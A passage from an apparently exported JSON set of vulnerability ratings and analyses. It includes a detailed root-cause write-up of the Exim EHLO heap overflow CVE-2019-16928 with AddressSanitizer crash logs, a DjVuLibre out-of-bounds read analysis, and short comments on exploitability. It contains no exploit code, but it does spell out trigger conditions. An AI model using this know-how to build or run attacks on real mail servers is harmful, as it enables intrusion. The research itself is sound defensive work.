strings+strings_size, buffer, length);\r\n      }\r\n```\r\n\r\nIf the char array does not end with a null byte, a null byte is inserted (and size readjusted):\r\n\r\n```cpp\r\n      if (strings[strings.size()-1] != 0)\r\n        {\r\n         int strings_size=strings.size();\r\n         strings.resize(strings_size+1);\r\n         strings[strings_size] = 0;\r\n        }\r\n```\r\n\r\nNext, a reference of the GTArray is copied, and then this is used as a file ID according to this line:\r\n\r\n```cpp\r\n         file->id=ptr;\r\n```\r\n\r\nThe `id` member is actually a custom GUTF8String. It overrides the `=` operator, which the implementation can be found here:\r\n\r\n```cpp\r\n// Line 2625 in GString.cpp\r\nGUTF8String& GUTF8String::operator= (const char *str)\r\n{ return init(GStringRep::UTF8::create(str)); }\r\n```\r\n\r\nThe implementation for `create()` can be found here:\r\n\r\n```cpp\r\n// Line 156 in GString.cpp\r\nGP<GStringRep>\r\nGStringRep::UTF8::create(const char *s)\r\n{\r\n  GStringRep::UTF8 dummy;\r\n  return dummy.strdup(s);\r\n}\r\n```\r\n\r\nThe `strdup` function isn't exactly the same as the original `strdup` in C/C++, in fact it is custom for UTF8. This is where the problem finally blows up. Although `DjVmDir::decode` is aware that a null byte is necessary at the end of the string, it is just a ASCII type null byte terminator, which is only one byte, but that's not enough for UTF8. In other words, the null byte terminating routine in `DjVmDir::decode` does not really work. As a result, an off-by-one out-of-bound read condition could occur, which is proven in the AddressSanitizer [bug report](https://sourceforge.net/p/djvu/bugs/296/) by Hongxu Chen:\r\n\r\n```\r\n==14708==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6040000000f1 at pc 0x7fd31456a66e bp 0x7ffc59407e10 sp 0x7ffc594075b8\r\nREAD of size 1 at 0x6040000000f1 thread T0\r\n    #0 0x7fd31456a66d  (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x5166d)\r\n    #1 0x7fd3141a5d5b in GStringRep::strdup(char const*) const /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/GString.cpp:1017\r\n    #2 0x7fd31419f474 in GStringRep::UTF8::create(char const*) /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/GString.cpp:160\r\n    #3 0x7fd3141b64fd in GUTF8String::operator=(char const*) /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/GString.cpp:2626\r\n    #4 0x7fd314054dbb in DjVmDir::decode(GP<ByteStream> const&) /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/DjVmDir.cpp:315\r\n    #5 0x7fd3140c0b54 in display_djvm_dirm /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/DjVuDumpHelper.cpp:172\r\n    #6 0x7fd3140c2a64 in display_chunks /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/DjVuDumpHelper.cpp:335\r\n    #7 0x7fd3140c2b1f in display_chunks /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/DjVuDumpHelper.cpp:342\r\n    #8 0x7fd3140c31f0 in DjVuDumpHelper::dump(GP<ByteStream>) /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/DjVuDumpHelper.cpp:361\r\n    #9 0x562f0317dba7 in display(GURL const&) /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/tools/djvudump.cpp:128\r\n    #10 0x562f0317e35d in main /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/tools/djvudump.cpp:178\r\n    #11 0x7fd3135fbb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)\r\n    #12 0x562f0317d909 in _start (/home/hongxu/FOT/djvulibre/djvu-djvulibre-git/install/bin/djvudump+0x3909)\r\n\r\n0x6040000000f1 is located 0 bytes to the right of 33-byte region [0x6040000000d0,0x6040000000f1)\r\nallocated by thread T0 here:\r\n    #0 0x7fd3145f9458 in operator new(unsigned long) (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xe0458)\r\n    #1 0x7fd31415c17c in GArrayBase::resize(int, int) /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/GContainer.cpp:220\r\n    #2 0x7fd31405ede4 in GArrayTemplate<char>::resize(int) /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/GContainer.h:496\r\n    #3 0x7fd314054aff in DjVmDir::decode(GP<ByteStream> const&) /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/DjVmDir.cpp:298\r\n    #4 0x7fd3140c0b54 in display_djvm_dirm /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/DjVuDumpHelper.cpp:172\r\n    #5 0x7fd3140c2a64 in display_chunks /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/DjVuDumpHelper.cpp:335\r\n    #6 0x7fd3140c2b1f in display_chunks /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/DjVuDumpHelper.cpp:342\r\n    #7 0x7fd3140c31f0 in DjVuDumpHelper::dump(GP<ByteStream>) /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/libdjvu/DjVuDumpHelper.cpp:361\r\n    #8 0x562f0317dba7 in display(GURL const&) /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/tools/djvudump.cpp:128\r\n    #9 0x562f0317e35d in main /home/hongxu/FOT/djvulibre/djvu-djvulibre-git/tools/djvudump.cpp:178\r\n    #10 0x7fd3135fbb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)\r\n```\r\n\r\nIt seems the vulnerability falls under the local attack category, therefore an out-of-bound read type vulnerability would not be directly threatening to the system. In our case specifically, it looks like the extra read would actually cause a crash somewhere in the `decode()` function.\r\n",
      "score": 1,
      "metadata": {
        "exploitability": 5,
        "urgent-to-patch": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "4b840b1e-6c28-4952-9401-156f04b52e91",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "862dfb64-ee07-4f1f-b5f3-8f2c3a560a5f",
      "created": "2019-10-02T22:34:27.459775Z",
      "revisionDate": "2020-02-13T17:12:02.060794Z",
      "document": "Implementing a crash for this is pretty easy. Implementing an exploit may be tricky given the diversity of heap configurations, though if you targeted one distro or container it's probably easier.\r\n\r\nNote, this vulnerability was also fixed before it was reported as a result of deeper analysis of user-controlled variables in Exim as a whole. Future releases of Exim may be much harder to exploit as a result of this general effort. See this note from Exim maintainer 'Comet' on areas they need help with in the future:  https://lwn.net/Articles/801265/",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 4,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "b3e537c4-79cf-44b2-ae15-4d7e5b7baa01",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "862dfb64-ee07-4f1f-b5f3-8f2c3a560a5f",
      "created": "2019-10-04T22:50:37.399381Z",
      "revisionDate": "2020-02-13T17:12:01.782872Z",
      "document": "# CVE-2019-16928: Exim EHLO Heap Overflow Vulnerability\r\n\r\n## Description\r\n\r\n[Exim](https://www.exim.org/) is an open source mail transfer agent (MTA) designed for receiving, routing, and delivering email messages. It is mostly installed on Unix-like systems, sometimes Microsoft Windows using Cygwin. [As of 2019](http://www.securityspace.com/s_survey/data/man.201907/mxsurvey.html), approximately 57% of the publicly reachable mail servers on the Internet ran Exim, therefore it is quite a popular software. \r\n\r\nA vulnerability was found in Exim by a Chinese security team called [QAX A-Team](https://github.com/QAX-A-Team), specifically related to the string_vformat() function not resizing a heap buffer correctly, resulting a heap overflow. Proof-of-concept is publicly available, and remote code execution could be possible. Since Exim has been widely used on the Internet, [media attention](https://threatpost.com/critical-exim-flaw-opens-servers-to-remote-code-execution/148773/) for the vulnerability was also high. More details about the potential impact can be found the [Project Sonar research](https://blog.rapid7.com/2019/09/10/cve-2019-15846-privileged-remote-code-execution-vulnerability-in-the-exim-mailer-what-you-need-to-know/) from Rapid7.\r\n\r\n## Technical Details\r\n\r\n### The Bug Report\r\n\r\nInitial information about the vulnerability can be traced to a ticket on Exim's BugZilla system, also known as [#2449](https://bugs.exim.org/show_bug.cgi?id=2449). In there, we can see that the vulnerability is described as a heap overflow in the string_vformat() function, which can be triggered with a EHLO command. A Python proof-of-concept is also available.\r\n\r\nA commit for the fix can also be found under the exim-4.92.2+fixes branch, which is a simple one-line change to the size argument for the `gstring_grow` in file string.c:\r\n\r\n```c\r\n// string.c:1593\t\r\ngstring_grow(g, g->ptr, width - (lim - g->ptr)); // Vulnerable version\r\ngstring_grow(g, g->ptr, width);                  // Patched version\r\n```\r\n\r\nNow that the bug seems pretty legit, let's go ahead and set up a box for debugging purposes.\r\n\r\n## Vulnerable Setup\r\n\r\nThe Exim source can be downloaded and compiled on a Unix-based machine. In my case, I set up a Ubuntu 18 box, with the following prepared:\r\n\r\n```bash\r\nsudo apt update && apt install build-essential clang libdb-dev libperl-dev libsasl2-dev libxt-dev libxaw7-dev\r\n```\r\n\r\n\u0010And then I got the 4.92.2 version:\r\n\r\n```bash\r\nwget http://exim.mirror.colo-serv.net/exim/exim4/old/exim-4.92.2.tar.xz\r\n```\r\n\r\nTo build Exim, a Makefile needs to be created, and the easier way is by doing this in the Exim folder (also, remember to set the EXIM_USER option in the file):\r\n\r\n```bash\r\ncp src/EDITME Local/Makefile && cp exim_monitor/EDITME Local/eximon.conf\r\n```\r\n\r\nFor debugging purposes, I compiled Exim as a \"PIE\" binary with AddressSanitizer:\r\n\r\n```bash\r\nCC=clang CFLAGS+=\" -g -fPIC -fsanitize=address\" ASAN_LIBS+=\"-static-libasan\" ASAN_FLAGS+=\"-fsanitize=address -fno-omit-frame-pointer\" FULLECHO='' LFLAGS+=\"-L/usr/lib/llvm-6.0/lib/clang/6.0.0/lib/linux/ -lasan -pie\" ASAN_OPTIONS=detect_leaks=0:symbolize=1 LDFLAGS+=\" -lasan -pie -ldl -lm -lcrypt\" LD_PRELOAD+=\"/usr/lib/gcc/x86_64-linux-gnu/7/libasan.so\" LIBS+=\"-lasan -pie\" make -e clean all\r\n```\r\n\r\nNote: For some reason, I couldn't really compile Exim with GCC with AddressSanitizer, and clang ended up being a much easier choice.\r\n\r\nAfter that, the Exim binary can be found in the `build-Linux-x86_64` directory. Typically, I prefer to verify that I compiled something correctly (such as PIE and ASAN states), so in this case I used [pwntools](https://github.com/Gallopsled/pwntools) to check this:\r\n\r\n```bash\r\n$ python pwntools/pwnlib/commandline/checksec.py exim-4.92.2/build-Linux-x86_64/exim\r\n[*] '/home/wchen/Desktop/exim-4.92.2/build-Linux-x86_64/exim'\r\n    Arch:     amd64-64-little\r\n    RELRO:    Partial RELRO\r\n    Stack:    No canary found\r\n    NX:       NX enabled\r\n    PIE:      PIE enabled\r\n    ASAN:     Enabled\r\n```\r\n\r\nAnd finally, start Exim as a foreground process:\r\n\r\n```bash\r\nsudo build-Linux-x86_64/exim -bd -d\r\n```\r\n\r\n### Code Analysis\r\n\r\nLooking at the bug report, the patched code actually comes from a function called `string_vformat`. The purpose of it is to build or append to a custom string object that can automatically grow if necessary, and it is declared this way:\r\n\r\n```c\r\ngstring* string_vformat(gstring * g, BOOL extend, const char *format, va_list ap)\r\n```\r\n\r\nThe `gstring` argument is a custom structure that is defined in the structs.h file as follows (Line 29):\r\n\r\n```c\r\ngstring structure (structs.h:29)\r\n\r\ntypedef struct gstring {\r\n  int    size;        /* Current capacity of string memory */\r\n  int    ptr;        /* Offset at which to append further chars */\r\n  uschar * s;        /* The string memory */\r\n} gstring;\r\n```\r\n\r\nThe second argument for `string_vformat` is a boolean called `extend`. This is simply a flag that indicates whether the program wants the gstring to grow or not. And finally, there's a `format` and `va_list` argument, which is similar to how `sprint` works.\r\n\r\nThe second argument is an important piece to the puzzle, because the vulnerable code requires it to be true in order to trigger. In this case, the `string_vformat` function needs to grow gstring in order to make room for the input that it's handling, and then the gstring will tell the function which index to begin saving the new input. This idea can be demonstrated as below:\r\n\r\nFirst, let's say we have allocated a 10-byte buffer. Visually, the 00 (null byte) represents free space:\r\n\r\n```\r\nIndex:   0  1  2  3  4  5  6  7  8  9\r\nBuffer: [00 00 00 00 00 00 00 00 00 00]\r\n```\r\n\r\nInitially, let's also say we already have some data in the buffer, a few \"A\" characters. At this point, the offset at which to append further chars would be index 5:\r\n\r\n```\r\n                        * Offset starts at 5\r\nIndex:   0  1  2  3  4  5  6  7  8  9\r\nBuffer: [41 41 41 41 41 00 00 00 00 00]\r\n```\r\n\r\nNow, we have a scenario where the new input is a bunch of \"B\"s that is also 10-byte long:\r\n\r\n```\r\nchar* input = \"BBBBBBBBBB\"; // In hex, these are 42 42 42...\r\n```\r\n\r\nTo put that in the buffer, we need to grow it. So in theory what is new size for the adjusted buffer? The math is:\r\n\r\n```c\r\nstrlen(input) + offset;\r\n```\r\n\r\nAfter growing the buffer, it should look like this:\r\n\r\n```\r\n                        * 5 = offset value\r\nIndex:   0  1  2  3  4  5  6  7  8  9  10 11 12 13 14\r\nBuffer: [41 41 41 41 41 00 00 00 00 00 00 00 00 00 00]\r\n```\r\n\r\nAnd finally, we have enough space to store the input:\r\n\r\n```\r\n                        * 5 = offset value\r\nIndex:   0  1  2  3  4  5  6  7  8  9  10 11 12 13 14\r\nBuffer: [41 41 41 41 41 42 42 42 42 42 42 42 42 42 42]\r\n```\r\n\r\nKnowing this concept, it is much easier to understand the vulnerability. The reason of the overflow is because the size calculation is wrong. The `gstring_grow` function in Exim simply does not grow enough for gstring, as a result when it is storing the user supplied input from the EHLO command, it overflows, kind of like the following:\r\n\r\n```\r\n                        * 5 = offset value\r\nIndex:   0  1  2  3  4  5  6  7  8  9  10 11 12 13 14\r\nBuffer: [41 41 41 41 41 42 42 42 42 42 42 42 42 42 42] 42 42 42 42 42 ...\r\n                                                       ^ Overflow\r\n```\r\n\r\nAlthough the vulnerability requires additional buffer growth, not every call to `string_vformat` sets the `extend` flag too true. Looking around, it looks like there are many possible ways to trigger it:\r\n\r\n* There are at least five functions that directly call `string_vformat` with the `extend` flag to true.\r\n* One of them is called `string_fmt_append`, and this function is used by about 56 other places through out the code base.\r\n\r\nThe scope here would be too time consuming to determine the actual vulnerable path, but we can narrow this down by a lot. All we need to do is figure out when the input enters the code, until when the vulnerable code triggers, then we can look into that code path:\r\n\r\n```\r\nInput ---> Code path to be investigated ---> string_vformat with extend argument to TRUE\r\n```\r\n\r\nIn the Exim log, we can get a hint on where the input sort of begins:\r\n\r\n```\r\n70289 SMTP>> 220 ubuntu ESMTP Exim 4.92.2 Fri, 04 Oct 2019 09:21:46 -0700\r\n70289 Process 70289 is ready for new message\r\n70289 smtp_setup_msg entered\r\n70289 SMTP<< EHLO AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n```\r\n\r\nNotice that we see a \"smtp_setup_msg\" message first, and then the EHLO with our input. So if we search for that message and find the function printing it, we have a starting point:\r\n\r\n```c\r\n// smtp_in.c:3891\r\nint smtp_setup_msg(void)\r\n{\r\nint done = 0;\r\nBOOL toomany = FALSE;\r\nBOOL discarded = FALSE;\r\nBOOL last_was_rej_mail = FALSE;\r\nBOOL last_was_rcpt = FALSE;\r\nvoid *reset_point = store_get(0);\r\n\r\nDEBUG(D_receive) debug_printf(\"smtp_setup_msg entered\\n\");\r\n  // ... code ...\r\n```\r\n\r\nSo now, I guess we are looking for this type of code path:\r\n\r\n```\r\nsmtp_setup_msg() ---> Code path unknown --> string_vformat(gs, TRUE, format, ap);\r\n```\r\n\r\nThis is the very vague version, but in reality the unknown code path is often a rabbit hole. A large codebase such as Exim definitely took me a lot of time to clean up the noises. One way to reverse engineer how point A might get to point B is by using some kind of flow graph. Honestly, I don't know if there is a good one for C/C++ source code, but you certainly do this with a plugin called [AlleyCat](https://github.com/devttys0/ida/tree/master/plugins/alleycat) from IDA Pro.\r\n\r\nThis is the graph I got that that shows how `smtp_setup_msg()` could get to `string_vformat`:\r\n\r\n![alleycat_graph](https://user-images.githubusercontent.com/51334915/66244626-e46ae780-e6f8-11e9-9c92-673bfaf2bc13.png)\r\n\r\nLooking at this graph is kind of like finding a needle in a haystack, but if you use it like a map to aid code analysis, you're less likely to get lost in the rabbit hole. What's really funny is that out of this complex map, let me show you the actual path to trigger the vulnerable code:\r\n\r\n![found_path](https://user-images.githubusercontent.com/51334915/66244620-e0d76080-e6f8-11e9-981a-562af223be9a.png)\r\n\r\nIn the end, we only need to look at three functions:\r\n\r\n1. smtp_setup_msg() in smtp_in.c\r\n2. string_fmt_append in string.c\r\n3. string_vformat() in string.c (the vulnerable function)\r\n\r\nIn order to trigger step 2 (the string_fmt_append function), a `user_msg` variable also needs to be null. The `user_msg` is set from a function called `acl_check()` (in acl.c). The null return value indicates the check returns OK, so that means our HELO needs to fail the ACL check.\r\n\r\nAnother requirement of the vulnerability is that if Exim is able to look up and resolve an IP address, then it would not trigger. For testing purposes, the easier way to clear your /etc/resolve.conf.\r\n\r\nAnd finally, now with a good understanding of the vulnerable code path, we can verify all this with AddressSanitizer, and this concludes our analysis for CVE-2019-16928:\r\n\r\n```\r\n==56449==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62500000c598 at pc 0x7f8cd18048f9 bp 0x7ffe0bb4dea0 sp 0x7ffe0bb4d630\r\nWRITE of size 11294 at 0x62500000c598 thread T0\r\n    #0 0x7f8cd18048f8 in __interceptor_vsprintf (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x9e8f8)\r\n    #1 0x7f8cd1804c86 in __interceptor_sprintf (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x9ec86)\r\n    #2 0x558f99fc796c in string_vformat /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/string.c:1602\r\n    #3 0x558f99df7ee5 in debug_vprintf /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/debug.c:240\r\n    #4 0x558f99df6a3a in debug_printf /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/debug.c:165\r\n    #5 0x558f99ebeb20 in host_build_sender_fullhost /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/host.c:662\r\n    #6 0x558f99f9801a in smtp_setup_msg /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/smtp_in.c:4178\r\n    #7 0x558f99df0236 in handle_smtp_call /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/daemon.c:504\r\n    #8 0x558f99dec11f in daemon_go /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/daemon.c:2057\r\n    #9 0x558f99e5b0e9 in main /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/exim.c:4670\r\n    #10 0x7f8cd0386b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)\r\n    #11 0x558f99dc05b9 in _start (/home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/exim+0x1125b9)\r\n\r\n0x62500000c598 is located 0 bytes to the right of 9368-byte region [0x62500000a100,0x62500000c598)\r\nallocated by thread T0 here:\r\n    #0 0x7f8cd1844b50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)\r\n    #1 0x558f99fbb78b in store_malloc_3 /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/store.c:544\r\n    #2 0x558f99fba87c in store_get_3 /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/store.c:167\r\n    #3 0x558f99fbd6f1 in store_newblock_3 /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/store.c:511\r\n    #4 0x558f99fcaab0 in gstring_grow /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/string.c:1163\r\n    #5 0x558f99fc781b in string_vformat /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/string.c:1597\r\n    #6 0x558f99df7ee5 in debug_vprintf /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/debug.c:240\r\n    #7 0x558f99df6a3a in debug_printf /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/debug.c:165\r\n    #8 0x558f99ebeb20 in host_build_sender_fullhost /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/host.c:662\r\n    #9 0x558f99f9801a in smtp_setup_msg /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/smtp_in.c:4178\r\n    #10 0x558f99df0236 in handle_smtp_call /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/daemon.c:504\r\n    #11 0x558f99dec11f in daemon_go /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/daemon.c:2057\r\n    #12 0x558f99e5b0e9 in main /home/sinn3r/Desktop/exim-4.92.2/build-Linux-x86_64/exim.c:4670\r\n    #13 0x7f8cd0386b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)\r\n\r\nSUMMARY: AddressSanitizer: heap-buffer-overflow (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x9e8f8) in __interceptor_vsprintf\r\nShadow bytes around the buggy address:\r\n  0x0c4a7fff9860: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x0c4a7fff9870: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x0c4a7fff9880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x0c4a7fff9890: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x0c4a7fff98a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n=>0x0c4a7fff98b0: 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x0c4a7fff98c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x0c4a7fff98d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x0c4a7fff98e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x0c4a7fff98f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x0c4a7fff9900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\nShadow byte legend (one shadow byte represents 8 application bytes):\r\n  Addressable:           00\r\n  Partially addressable: 01 02 03 04 05 06 07 \r\n  Heap left redzone:       fa\r\n  Freed heap region:       fd\r\n  Stack left redzone:      f1\r\n  Stack mid redzone:       f2\r\n  Stack right redzone:     f3\r\n  Stack after return:      f5\r\n  Stack use after scope:   f8\r\n  Global redzone:          f9\r\n  Global init order:       f6\r\n  Poisoned by user:        f7\r\n  Container overflow:      fc\r\n  Array cookie:            ac\r\n  Intra object redzone:    bb\r\n  ASan internal:           fe\r\n  Left alloca redzone:     ca\r\n  Right alloca redzone:    cb\r\n==56449==ABORTING\r\n```\r\n\r\n## References\r\n\r\n* [Exim off by one RCE exploiting CVE-2018-6789](https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/) by Meh\r\n* [Fuzzing arbitrary functions in elf binaries](https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/) by hugsy\r\n* [Exim CVE-2019-16928 Bug Report](https://bugs.exim.org/show_bug.cgi?id=2449)\r\n* [The patch diff for CVE-2019-16928](https://github.com/Exim/exim/commit/478effbfd9c3cc5a627fc671d4bf94d13670d65f#diff-2df79c106af94fb3d05bc3f75d7f2abbL1133-L1590)\r\n* [Exim4 string_format Heap Buffer Overflow Exploit Example](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/smtp/exim4_string_format.rb)\r\n* [Exim Archive](http://exim.mirror.colo-serv.net/exim/exim4/old/)\r\n* [Example of building and install Exim](https://www.lisenet.com/2015/compile-and-install-exim-from-source-with-ldap-and-mysql-lookup-support-on-ubuntu-14-04/)",
      "score": 4,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 3,
        "confidence-in-ratings": 5
      },
      "tags": []
    },
    {
      "id": "1dcc3799-c2c2-4417-b17f-d343005cb8b3",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "70fa909e-b9d0-4b61-b54f-9639e5a20e3e",
      "created": "2019-10-09T21:30:12.039073Z",
      "revisionDate": "2020-02-13T17:12:01.514587Z",
      "document": "The Metasploit module for this against Exim (exim_gethostbyname_bof) was pretty useful in 2015, though there are lots of other ways to exploit Exim that kind of show that things haven't changed a whole lot since then. Hopefully there will be more systematic ways to guard against heap overflows in general on the OS these days, even if it's at a performance loss (asan?).",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "b2745522-6292-4e87-96b1-df4036cf2317",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "857fc1a3-ee6c-45de-93a8-a4d31d5ed28f",
      "created": "2019-10-09T23:02:01.369679Z",
      "revisionDate": "2020-02-13T17:12:01.318567Z",
      "document": "Noticed this while looking into recent iTerm vulnerabilities and thinking about how to exploit iTerm's builtin image rendering and file download capabilities. This seems to have the ability to cause havoc especially on machines that cannot upgrade to newer OSes due to hardware obsoleting by Apple. Curious if there might be other things to look at in NSImage as well.\r\n\r\nMarking utility a little lower just because this is a couple-year old vuln.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "122bb0b0-7d8c-46b4-b47b-cd0794c605da",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "9efebe1b-7367-4d14-8ebe-cfc2fcf7be6f",
      "created": "2019-10-09T23:13:26.535497Z",
      "revisionDate": "2020-02-13T17:12:01.118277Z",
      "document": "It's probably just as important to choose terminal emulators that have minimal feature sets if you are doing administration work in the first place. iTerm2 in particular has a lot of features that are internally labeled as insecure, so it probably makes sense to evaluate if you are actually using those features and if you need them.\r\n\r\nA maybe growing thread on exploitation: https://twitter.com/TheColonial/status/1182032288785166336\r\n\r\nAlso here's where to disable some of the other features by answering 'Yes' to this setting.\r\n\r\n![image](https://user-images.githubusercontent.com/4108654/66527074-67f15380-eac0-11e9-8890-ed3b52daa119.png)",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 1,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "513cccc4-2d7b-4b78-b8fe-1e4ef9d0d01c",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "3c42d63d-858b-4be3-8c0e-3423577b453b",
      "created": "2019-10-10T19:24:07.320178Z",
      "revisionDate": "2020-02-13T17:12:00.869517Z",
      "document": "As I understand it, most kubernetes clusters will require auth or a foothold to reach in the first place. Why would you bother with a DoS attack at that point? Much more attacker value to be had in exploiting the cluster in ways that don't bring it down.\r\n\r\nCompare authenticated:\r\nhttps://www.shodan.io/search?query=kubernetes+401\r\n\r\nAnd unauthenticated searches:\r\nhttps://www.shodan.io/search?query=kubernetes+%21401",
      "score": 2,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1,
        "urgent-to-patch": 1,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "a20ecf39-2a1f-478e-9ebf-dcf0bb935d6e",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "a3f622cd-e365-46c5-9417-2eb5912627f5",
      "created": "2019-10-14T21:11:02.825301Z",
      "revisionDate": "2020-07-10T13:20:55.636254Z",
      "document": "While this is easy to exploit and low risk to the stability of the target system, it is post-exploitation, and highly dependent on a relatively uncommon and paranoid type of configuration where an administrator is actively monitoring trusted or untrusted users on a multi-user system. There may be some way to leverage this as a primitive for a different kind of exploit chain, but more often than not users are allowed to just pivot into root directly, or specific privileged executables are escalated with setuid rather than sudo.\r\n\r\nSomeone somewhere has a that golden target, and is having a field day. Everyone else had root anyway :)",
      "score": 5,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5,
        "urgent-to-patch": 3,
        "used-successfully": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "f2a8afd8-1a96-4b06-a1d9-d735ce0200b0",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "a3f622cd-e365-46c5-9417-2eb5912627f5",
      "created": "2019-10-15T15:23:27.848943Z",
      "revisionDate": "2020-02-13T17:12:00.399338Z",
      "document": "Patch, but don't freak out.",
      "score": 3,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "d1608965-c872-4cb3-a3ef-ae94c3460f24",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "a3f622cd-e365-46c5-9417-2eb5912627f5",
      "created": "2019-10-15T15:52:31.875053Z",
      "revisionDate": "2020-06-02T14:31:17.992123Z",
